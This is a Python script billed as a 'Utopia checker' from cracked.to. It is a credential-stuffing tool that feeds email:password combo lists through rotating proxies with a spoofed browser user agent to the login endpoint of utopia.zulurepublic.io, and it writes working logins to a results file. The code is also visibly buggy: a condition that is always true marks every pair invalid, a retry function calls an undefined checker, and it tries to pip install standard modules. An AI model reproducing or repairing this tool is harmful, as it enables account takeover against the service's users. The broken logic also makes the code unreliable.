import os
from os import system
import json
import string
try:
  import requests
except:
  system('pip install requests')
  import requests
try:
  import random
except :
  system('pip install random')
  import random
try:
  import time
  from time import sleep
except :
  system('pip install time')
  import time
  from time import sleep
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def utopia(combo,proxy):
  def id(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
  output = id(12,"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
  id = str(output)
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36','SomeRandomHeader':id,
      } 
  )
  url = 'https://utopia.zulurepublic.io/v1/user/login'
  data ={"email":x,"password":y}

  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if '{"success":false' or 'AUTH_FAILED' in r.text:
    status = 'invalid'
  elif 'success":true' in r.text:
    status = 'valid'
  else :
    status = 'invalid'
  return status

def proxy_loader(proxyfile):
  lines = open(proxyfile).read().splitlines()
  proxy =random.choice(lines)
  proxies = {"http": proxy}
  return proxies
def retry(x):
  output = proxy_loader()
  output = checker(x,output)

  return output
def combo_loader():
  file = input(bcolors.OKBLUE+('Please input your combo file : '))
  file2 = input(bcolors.OKBLUE+('Please input your proxy file(Only Http) : '))
  try:
    f = open(file, "r")
  except:
    exit()
  for x in f:
    output = proxy_loader(file2)
    output = utopia(x,output)
    if output == 'valid':
      print(bcolors.OKGREEN+'valid : '+ x ) 
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/valid.txt','a+')
      f.write(x+ '\n')
    elif output == 'invalid': 
      print(bcolors.WARNING+'invalid ' + x) 
    elif output == '2fa':
      print(f'{bcolors.WARNING}2fa : {x}')
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/2fa.txt','a+')
      f.write(x.strip()+'\n')
    else:
      print('\n')
      


print(bcolors.OKBLUE+'Welcome to Utopia checker by cracked.to/lamlucius8')
sleep(3)


combo_loader()
print(bcolors.OKCYAN+'All valid accounts will be in results folder valid.txt' )
sleep(15)

